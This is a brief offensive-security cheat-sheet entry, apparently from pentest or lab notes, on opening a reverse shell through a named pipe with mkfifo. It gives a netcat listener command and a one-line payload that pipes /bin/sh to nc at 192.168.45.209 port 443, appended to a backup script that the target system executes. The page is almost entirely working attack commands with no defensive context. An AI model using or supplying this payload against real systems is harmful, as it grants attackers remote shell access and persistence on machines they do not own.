---
title: "Reverse Shell (mkfifo)"
---

# Reverse Shell (mkfifo)

Reverse shell via named pipe using `mkfifo`, useful in environments without an interactive bash. Creates a named pipe at `/tmp/f` to redirect stdin/stdout through netcat.

```shell
# Listener
rlwrap nc -vnlp 443

# Payload — inject into target (e.g. a backup script executed by the system)
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.209 443 >/tmp/f" >> user_backups.sh
```
